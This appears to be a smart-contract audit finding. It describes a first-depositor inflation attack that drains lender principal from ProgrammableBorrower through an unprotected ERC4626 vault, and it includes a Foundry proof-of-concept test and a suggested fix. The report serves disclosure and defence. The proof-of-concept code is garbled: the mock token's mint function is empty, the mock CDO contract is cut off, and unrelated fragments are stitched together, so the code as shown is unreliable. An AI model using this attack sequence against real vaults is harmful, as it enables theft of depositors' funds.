### Title
Unvalidated ERC4626 deposit lets a first depositor steal revolving-credit principal - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower` can be configured with an arbitrary ERC4626 vault whose only validation is that `asset()` matches the pool underlying, while `_depositToVault` accepts whatever shares the vault mints without a minimum-share or post-deposit value check. [1](#0-0) [2](#0-1) 

### Finding Description
The revolving-credit deployment accepts an externally supplied vault address and initializes `ProgrammableBorrower` with it. [3](#0-2) [4](#0-3) 

If the configured vault is empty and lacks first-deposit inflation protection, an unprivileged vault user can front-run the pool’s first deposit, deposit `1` wei to receive the first share, and donate approximately the pool deposit amount directly to the vault. [5](#0-4) 

At `onStartEpoch`, `ProgrammableBorrower` snapshots the borrower-held underlying as `epochStartVaultAssets` and deposits the entire on-hand balance into the inflated vault. [6](#0-5) 

`_depositToVault` calls `vault.deposit` but never requires `shares > 0` or verifies that `convertToAssets(shares)` remains close to `_assetAmount`, so an integer-share vault can transfer the full deposit while minting zero shares. [2](#0-1) 

The attacker then redeems the single pre-existing share for nearly all vault assets, including the pool deposit, while `ProgrammableBorrower` retains no vault shares or underlying. [7](#0-6) 

### Impact Explanation
The pool’s deposited principal is transferred to the public ERC4626 vault but represented by zero shares, allowing the first-share holder to redeem the combined donation and pool deposit for approximately a one-to-one profit after donating the initial amount. [2](#0-1) 

`epochStartVaultAssets` still contains the pre-deposit principal baseline, while `_currentVaultAssets()` returns zero, so `_vaultNetInterest()` records the stolen principal as a vault loss. [8](#0-7) 

Because `totalInterestDueNow()` merely clamps negative vault PnL to zero rather than burning principal, the CDO can continue carrying strategy-token principal that is no longer backed by borrower or vault assets. [9](#0-8) 

On a close-pool stop, IdleCDO attempts to pull the strategy-token principal plus pending withdrawals; the empty `ProgrammableBorrower` balance makes the transfer fail and forces the borrower-default path, crystallizing insolvency rather than returning lender principal. [10](#0-9) [11](#0-10) 

For a first deposit of `A`, the attacker contributes approximately `A + 1`, redeems approximately `2A + 1`, and causes a quantified pool principal loss of `A`. [5](#0-4) 

### Likelihood Explanation
Exploitation requires the integration to use an ERC4626 vault that is empty, newly deployed, or otherwise has negligible supply and that computes shares from `assets * totalSupply / totalAssets` without adequate inflation defense. [12](#0-11) 

The attacker needs no privileged role: they only need permissionless access to the configured ERC4626 vault and the ability to front-run the first `onStartEpoch` deposit. [13](#0-12) 

The issue is not exploitable against every ERC4626 implementation because vaults with meaningful existing supply or virtual-share defenses can prevent zero-share capture, but the deployment validates neither property. [1](#0-0) 

### Recommendation
Validate the configured vault beyond `asset()` compatibility, including requiring an established minimum supply and testing that it implements inflation-resistant share accounting. [12](#0-11) 

Change `_depositToVault` to require a minimum returned share amount and verify the returned position value:

```solidity
uint256 shares = vault.deposit(_assetAmount, address(this));
if (shares == 0) revert InvalidAmount();
if (vault.convertToAssets(shares) < _assetAmount * BPS_TOLERANCE / 10_000) {
  revert InvalidAmount();
}
```

The post-deposit check should compare only the newly received shares, and the acceptable tolerance should account for documented ERC4626 rounding or fees. [2](#0-1) 

Operationally, the deployment should seed the vault atomically before lender funds are exposed or restrict integrations to vaults whose share inflation resistance is explicitly audited. [4](#0-3)

```solidity
  constructor() ERC20("Underlying", "UND") {}

  function mint(address to, uint256 amount) external {

  }
}

contract MockCDO {

    token = _token;

/// Minimal ERC4626-like vault without first-deposit inflation protection.
contract InflatableVault is ERC20 {
  IERC20 public immutable assetToken;

  constructor(address asset_) ERC20("Share", "SH") {
    assetToken = IERC20(asset_);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function totalAssets() public view returns (uint256) {
    return assetToken.balanceOf(address(this));
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * totalAssets() / supply;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    uint256 supply = totalSupply();
    uint256 assetsBefore = totalAssets();

    shares = supply == 0 ? assets : assets * supply / assetsBefore;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function withdraw(uint256 assets, address receiver, address owner)
    external
    returns (uint256 shares)
  {
    shares = assets * totalSupply() / totalAssets();
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }
}

contract ProgrammableBorrowerInflationTest is Test {
  uint256 internal constant DEPOSIT = 1_000_000e6;

  MockUnderlying internal underlying;
  InflatableVault internal vault;
  MockCDO internal cdo;
  ProgrammableBorrower internal borrower;

  address internal attacker = address(0xA77AC4);
  address internal realBorrower = address(0xB08);
  address internal proxyAdmin = address(0xAD);

  function setUp() public {
    // The same sequence applies on a fork when the configured vault is an
    // unprotected empty ERC4626.
    underlying = new MockUnderlying();
    vault = new InflatableVault(address(underlying));
    cdo = new MockCDO(address(underlying));

    ProgrammableBorrower implementation = new ProgrammableBorrower();
    borrower = ProgrammableBorrower(
      address(
        new TransparentUpgradeableProxy(
          address(implementation),
          proxyAdmin,
          abi.encodeWithSelector(
            ProgrammableBorrower.initialize.selector,
            address(vault),
            address(cdo),
            address(this),
            address(this),
            realBorrower,
            0
          )
        )
      )
    );
  }

  function testFirstDepositorCapturesEpochPrincipal() public {
    // Inflate the empty vault before the pool's first deposit.
    underlying.mint(attacker, DEPOSIT + 1);
    vm.startPrank(attacker);
    underlying.approve(address(vault), 1);
    vault.deposit(1, attacker);
    underlying.transfer(address(vault), DEPOSIT);
    vm.stopPrank();

    // Simulate IdleCDO sending epoch principal before invoking onStartEpoch.
    underlying.mint(address(borrower), DEPOSIT);
    vm.prank(address(cdo));
    borrower.onStartEpoch(0);

    // DEPOSIT * 1 share / (DEPOSIT + 1 assets) rounds to zero shares.
    assertEq(vault.balanceOf(address(borrower)), 0);

    // The attacker's one share owns the donation plus the pool deposit.
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);

    assertEq(vault.balanceOf(address(borrower)), 0);
    assertEq(underlying.balanceOf(address(borrower)), 0);
    assertEq(borrower.totalUnderlying(), 0);
    assertEq(borrower.vaultLoss(), DEPOSIT);
    assertEq(borrower.totalInterestDueNow(), 0);

    // Net attacker profit is DEPOSIT: attacker spent DEPOSIT + 1 and
    // redeemed approximately DEPOSIT + 1 + DEPOSIT.
    assertGe(underlying.balanceOf(attacker), DEPOSIT * 2);
  }
}
```

A deployment-fork version can substitute the already deployed vault address for `InflatableVault`, execute the same pre-deposit and donation sequence before the first `onStartEpoch`, and assert the same zero-share position and `vaultLoss() == DEPOSIT` result. [6](#0-5) [8](#0-7)

```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
```
